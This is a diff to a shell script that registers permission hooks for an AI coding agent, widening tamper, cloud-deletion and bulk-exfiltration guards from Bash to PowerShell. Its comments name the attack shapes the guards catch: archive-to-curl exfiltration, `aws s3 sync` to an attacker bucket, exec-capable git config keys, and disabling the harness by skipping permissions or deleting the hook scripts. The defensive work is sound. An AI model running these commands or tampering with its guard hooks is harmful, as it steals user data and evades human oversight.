@@ -30,7 +30,7 @@ get_hooks_for_mode() {
   # remaining gaps — `claude --dangerously-skip-permissions`/bypassPermissions, and
   # rm/mv/chmod-x/truncate/touch of the hook SCRIPTS, install dir, or kill-switch.
   # Disable: SUPERCHARGER_HARNESS_TAMPER_GUARD=0.
-  hooks+=("PreToolUse|Bash|${hooks_dir}/harness-tamper-guard.sh|")
+  hooks+=("PreToolUse|Bash,PowerShell|${hooks_dir}/harness-tamper-guard.sh|")
   hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/path-guard.sh|")
   # Critical-infra write gate: forces a confirm before editing CI/CD, container,
   # DB-migration, or auth files (guardrails.md's documented review triggers). Emits
@@ -71,13 +71,13 @@ get_hooks_for_mode() {
   # through the native CLI (aws/gcloud/az/kubectl/helm/gsutil/doctl/flyctl) where
   # safety.sh only guards cloud credential-theft/escape, not bulk deletes. ASK on
   # terminate/delete/uninstall/rm-r. Disable: SUPERCHARGER_CLOUD_CLI_GUARD=0.
-  hooks+=("PreToolUse|Bash|${hooks_dir}/cloud-cli-destructive-guard.sh|")
+  hooks+=("PreToolUse|Bash,PowerShell|${hooks_dir}/cloud-cli-destructive-guard.sh|")
   # v2.23.19: whole-tree exfil that carries NO sensitive-name token — safety-detect's
   # upload arms are gated on _SENSITIVE_PATHS, so `tar czf - . | curl --data-binary @-`,
   # `aws s3 sync . s3://attacker`, `rsync -a . host:` slip through. ASK on the SHAPE
   # (archive-to-network-sink, or whole cwd/root/home sync to remote). Anchored so local
   # archives + build-dir deploys pass. /profile-gated. Disable: SUPERCHARGER_BULK_EXFIL_GUARD=0.
-  hooks+=("PreToolUse|Bash|${hooks_dir}/bulk-exfil-guard.sh|")
+  hooks+=("PreToolUse|Bash,PowerShell|${hooks_dir}/bulk-exfil-guard.sh|")
   # v2.23.21: `git config`/`git -c` setting an EXEC-CAPABLE key (core.fsmonitor,
   # sshCommand, credential.helper, pager/editor, alias '!sh', filter clean/smudge,
   # diff/difftool/mergetool cmd, persistent hooksPath) → RCE on the next git op
